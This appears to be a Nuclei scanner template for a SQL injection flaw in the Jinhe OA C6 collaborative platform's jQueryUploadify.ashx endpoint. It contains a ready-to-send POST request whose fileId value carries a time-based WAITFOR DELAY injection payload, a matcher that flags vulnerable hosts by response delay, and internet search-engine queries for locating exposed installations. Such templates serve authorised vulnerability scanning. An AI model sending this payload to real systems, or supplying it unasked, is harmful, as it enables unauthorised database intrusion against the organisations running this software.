id: JinheOA_C6_jQueryUploadify_SQLi

info:
  name: JinheOA_C6_jQueryUploadify_SQLi
  author: HK
  severity: high
  description: 金和OA-C6协同管理平台jQueryUploadify.aspx存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="c6/Jhsoft.Web.login"
    Quake-query: body="c6/Jhsoft.Web.login"
    Hunter-query: body="c6/Jhsoft.Web.login"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 46

    type=delete&fileId=-99';WAITFOR+DELAY'0:0:4'--

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'